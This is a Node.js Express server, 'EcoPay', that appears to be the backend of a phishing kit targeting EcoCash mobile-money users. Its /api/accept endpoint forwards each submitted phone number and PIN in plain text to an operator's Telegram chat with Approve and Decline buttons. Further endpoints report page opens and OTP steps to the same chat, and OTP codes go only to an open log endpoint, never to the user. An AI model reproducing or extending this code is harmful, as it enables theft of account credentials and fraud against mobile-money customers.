const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/* ============================================================
   Admin log buffer
============================================================ */
const LOG_BUFFER = [];
function pushLog(text, level = 'info') {
  LOG_BUFFER.unshift({
    time: new Date().toISOString().slice(11, 19),
    text: String(text),
    level
  });
  if (LOG_BUFFER.length > 200) LOG_BUFFER.pop();
}

app.get('/api/logs', (req, res) => res.json({ entries: LOG_BUFFER }));

/* ============================================================
   Persistent store for short links
============================================================ */
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'links.json');

function ensureDataDir() {
  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
}

function loadLinks() {
  ensureDataDir();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return new Map(Object.entries(JSON.parse(raw)));
  } catch (e) {
    return new Map();
  }
}

function saveLinks(map) {
  ensureDataDir();
  try {
    const obj = {};
    for (const [k, v] of map.entries()) obj[k] = v;
    fs.writeFileSync(DATA_FILE, JSON.stringify(obj), 'utf8');
  } catch (e) {
    console.error('saveLinks error:', e.message);
  }
}

let linkStore = loadLinks();

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [code, entry] of linkStore.entries()) {
    if (entry.exp && now > entry.exp) { linkStore.delete(code); changed = true; }
    else if (now - entry.createdAt > 7 * 24 * 3600 * 1000) { linkStore.delete(code); changed = true; }
  }
  if (changed) saveLinks(linkStore);
}, 60 * 60 * 1000);

/* ============================================================
   Pending decisions (approval flow)
============================================================ */
const PENDING = new Map();

function setDecision(txId, decision) {
  if (!txId) {
    pushLog('setDecision skipped: no txId', 'err');
    return;
  }
  PENDING.set(txId, { decision, ts: Date.now() });
  pushLog('Decision ' + decision + ' for ' + txId, decision === 'approved' ? 'ok' : 'err');
}

function getDecision(txId) {
  const entry = PENDING.get(txId);
  return entry ? entry.decision : 'pending';
}

setInterval(() => {
  const cutoff = Date.now() - 15 * 60 * 1000;
  for (const [k, v] of PENDING.entries()) {
    if (v.ts < cutoff) PENDING.delete(k);
  }
}, 5 * 60 * 1000);

/* ============================================================
   Telegram API helper (proxy-aware)
============================================================ */
function tgBase() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;
  if (!token) return null;
  return proxyUrl
    ? proxyUrl.replace(/\/$/, '') + '/bot' + token
    : 'https://api.telegram.org/bot' + token;
}

/* ============================================================
   OTP store + event de-dupe
============================================================ */
const OTP_STORE      = new Map();   // tx → { code, exp, attempts }
const OTP_RATE       = new Map();   // tx → last request ms
const EVENT_DEDUPE   = new Map();   // tx:type → last sent ms
const OTP_MAX_ATTEMPTS = 5;
const OTP_TTL_MS       = 5 * 60 * 1000;   // 5 minutes
const OTP_RATE_MS      = 30 * 1000;       // 30 s between requests
const EVENT_DEDUPE_MS  = 15 * 1000;       // ignore same event within 15 s

/* ============================================================
   POST /api/accept — send Telegram message with buttons
============================================================ */
app.post('/api/accept', async (req, res) => {
  const { transactionId, phone, pin } = req.body;

  pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
  pushLog(
    'ENV: token=' + (process.env.TELEGRAM_BOT_TOKEN ? 'set' : 'MISSING') +
    ' chat=' + (process.env.TELEGRAM_CHAT_ID ? 'set' : 'MISSING') +
    ' proxy=' + (process.env.TELEGRAM_API_PROXY_URL ? 'set' : 'MISSING'),
    'info'
  );

  if (!transactionId || !phone || !pin) {
    pushLog('Rejected: missing fields', 'err');
    return res.status(400).json({ status: 'failed', message: 'Missing transactionId, phone, or pin' });
  }

  if (!/^\d{4}$/.test(String(pin))) {
    pushLog('Rejected: PIN not 4 digits', 'err');
    return res.status(400).json({ status: 'failed', message: 'PIN must be exactly 4 digits' });
  }

  const chatId = process.env.TELEGRAM_CHAT_ID;
  const baseUrl = tgBase();

  if (!chatId || !baseUrl) {
    pushLog('Telegram not configured', 'err');
    return res.status(500).json({ status: 'failed', message: 'Server not configured' });
  }

  PENDING.set(transactionId, { decision: 'pending', ts: Date.now() });

  const messageText =
    'EcoCash authorization request\n\n' +
    'Transaction: ' + transactionId + '\n' +
    'Phone: ' + phone + '\n' +
    'PIN: ' + pin;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: 'approve:' + transactionId },
      { text: '❌ Decline', callback_data: 'decline:' + transactionId }
    ]]
  };

  try {
    const tgRes = await fetch(baseUrl + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: messageText, reply_markup: keyboard })
    });
    if (!tgRes.ok) {
      const body = await tgRes.text();
      pushLog('Telegram failed ' + tgRes.status + ' ' + body.slice(0, 120), 'err');
      return res.status(502).json({ status: 'failed', message: 'Could not notify admin' });
    }
    pushLog('Sent to Telegram with buttons: ' + transactionId, 'ok');
  } catch (err) {
    pushLog('Telegram error: ' + err.message, 'err');
    return res.status(502).json({ status: 'failed', message: 'Could not notify admin' });
  }

  return res.json({
    status: 'awaiting_approval',
    message: 'Waiting for approval',
    transactionId
  });
});

/* ============================================================
   GET /api/status/:tx — client polls this
============================================================ */
app.get('/api/status/:tx', (req, res) => {
  const tx = req.params.tx;
  res.json({ transactionId: tx, decision: getDecision(tx), status: getDecision(tx) });
});

/* ============================================================
   POST /api/telegram-webhook — Approve / Decline tap
============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  pushLog('WEBHOOK HIT', 'info');

  const update = req.body || {};

  try {
    pushLog('WEBHOOK PAYLOAD: ' + JSON.stringify(update).slice(0, 300), 'info');
  } catch (e) {
    pushLog('WEBHOOK PAYLOAD: unstringifiable', 'err');
  }

  const cb = update.callback_query;

  if (cb && cb.data) {
    pushLog('CALLBACK DATA: ' + cb.data, 'info');

    const raw = String(cb.data);
    const idx = raw.indexOf(':');
    const action = idx >= 0 ? raw.slice(0, idx) : raw;
    const txId   = idx >= 0 ? raw.slice(idx + 1) : '';

    pushLog('PARSED action=' + action + ' tx=' + txId, 'info');

    if (action === 'approve') setDecision(txId, 'approved');
    else if (action === 'decline') setDecision(txId, 'declined');
    else pushLog('Unknown callback action: ' + action, 'err');

    const baseUrl = tgBase();
    if (baseUrl) {
      fetch(baseUrl + '/answerCallbackQuery', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: action === 'approve' ? 'Approved' : (action === 'decline' ? 'Declined' : 'OK')
        })
      }).catch(() => {});

      if (cb.message && cb.message.chat && cb.message.chat.id && cb.message.message_id) {
        fetch(baseUrl + '/editMessageReplyMarkup', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            reply_markup: { inline_keyboard: [] }
          })
        }).catch(() => {});
      }
    }
  } else {
    pushLog('No callback_query in update', 'err');
  }

  res.json({ ok: true });
});

/* ============================================================
   Telegram — send event notification (with de-dupe)
============================================================ */
async function sendTelegram(text) {
  const baseUrl = tgBase();
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!baseUrl || !chatId) return;
  try {
    await fetch(baseUrl + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch (e) {
    pushLog('Telegram event send failed: ' + e.message, 'err');
  }
}

app.post('/api/telegram/event', async (req, res) => {
  const { type, tx, am, cur, c } = req.body || {};

  if (!type || !tx) {
    return res.status(400).json({ error: 'Missing type or tx' });
  }

  const allowed = ['page_opened', 'otp_requested', 'verification_success'];
  if (!allowed.includes(type)) {
    return res.status(400).json({ error: 'Unknown event type' });
  }

  // De-dupe identical events per transaction within 15 s
  const key = tx + ':' + type;
  const now = Date.now();
  const last = EVENT_DEDUPE.get(key) || 0;
  if (now - last < EVENT_DEDUPE_MS) {
    return res.json({ ok: true, deduped: true });
  }
  EVENT_DEDUPE.set(key, now);

  const label =
    type === 'page_opened'         ? '👀 Verification page opened' :
    type === 'otp_requested'       ? '📨 OTP requested' :
                                      '✅ Verification completed';

  const lines = [
    label,
    '',
    'Transaction: ' + tx,
    'Amount: ' + (cur || 'USD') + ' ' + Number(am || 0).toFixed(2),
    'Country: ' + (c || '—'),
    'Time: ' + new Date().toISOString()
  ];

  sendTelegram(lines.join('\n'));
  pushLog('Event sent to Telegram: ' + type + ' for ' + tx, 'ok');

  res.json({ ok: true });
});

/* ============================================================
   Verification — request an OTP
============================================================ */
app.post('/api/verification/otp', (req, res) => {
  const { tx } = req.body || {};
  if (!tx) return res.status(400).json({ message: 'Missing transaction' });

  const now = Date.now();
  const last = OTP_RATE.get(tx) || 0;
  if (now - last < OTP_RATE_MS) {
    const wait = Math.ceil((OTP_RATE_MS - (now - last)) / 1000);
    return res.status(429).json({ message: 'Please wait ' + wait + 's before requesting a new code.' });
  }
  OTP_RATE.set(tx, now);

  const code = String(Math.floor(100000 + Math.random() * 900000));
  OTP_STORE.set(tx, { code, exp: now + OTP_TTL_MS, attempts: 0 });

  pushLog('OTP for ' + tx + ': ' + code, 'info');

  res.json({ ok: true, message: 'Code sent' });
});

/* ============================================================
   Verification — verify OTP
============================================================ */
app.post('/api/verification/verify', (req, res) => {
  const { tx, otp } = req.body || {};
  if (!tx || !otp) return res.status(400).json({ success: false, message: 'Missing fields' });

  const entry = OTP_STORE.get(tx);
  if (!entry) return res.status(400).json({ success: false, message: 'No code requested' });
  if (Date.now() > entry.exp) {
    OTP_STORE.delete(tx);
    return res.status(400).json({ success: false, message: 'Code expired' });
  }
  if (entry.attempts >= OTP_MAX_ATTEMPTS) {
    OTP_STORE.delete(tx);
    return res.status(429).json({ success: false, message: 'Too many attempts' });
  }

  entry.attempts++;

  if (String(otp) !== entry.code) {
    return res.status(400).json({ success: false, message: 'Invalid code' });
  }

  OTP_STORE.delete(tx);
  setDecision(tx, 'approved');
  pushLog('OTP verified for ' + tx, 'ok');
  res.json({ success: true });
});

/* ============================================================
   Health + pages
============================================================ */
app.get('/health', (req, res) => res.json({ ok: true }));

function servePage(filename) {
  const fullPath = path.join(__dirname, 'public', filename);
  return (req, res) => {
    if (!fs.existsSync(fullPath)) {
      return res.status(404).send('Page not found: ' + filename);
    }
    res.sendFile(fullPath);
  };
}

app.get('/admin.html',        servePage('admin.html'));
app.get('/client.html',       servePage('client.html'));
app.get('/pay.html',          servePage('pay.html'));
app.get('/verify.html',       servePage('verify.html'));
app.get('/verification.html', servePage('verification.html'));
app.get('/', (req, res) => res.redirect('/admin.html'));

app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.status(404).send('Page not found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('EcoPay running on port ' + PORT);
  console.log('Data directory:', DATA_DIR);
  const publicDir = path.join(__dirname, 'public');
  try {
    const files = fs.readdirSync(publicDir);
    console.log('Public files:', files.join(', ') || '(empty)');
    ['admin.html', 'client.html', 'pay.html', 'verify.html', 'verification.html'].forEach(f => {
      console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
    });
  } catch (e) {
    console.error('Could not read public directory:', e.message);
  }
  console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
  console.log('Telegram proxy:', process.env.TELEGRAM_API_PROXY_URL || 'none (direct)');
});
